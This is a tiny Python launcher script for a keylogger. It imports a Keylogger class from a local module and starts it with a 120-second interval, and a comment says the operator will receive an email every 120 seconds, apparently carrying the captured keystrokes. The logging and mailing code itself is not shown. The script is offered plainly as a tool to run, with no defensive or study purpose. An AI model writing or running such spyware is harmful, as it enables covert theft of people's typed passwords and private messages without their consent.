#!usr/bin/python3
from Keyloggers import keylogger2 as keylogger

my_keylogger = keylogger.Keylogger(120) #you will get a email once in 120 sec if you want less time means change it 
my_keylogger.start()
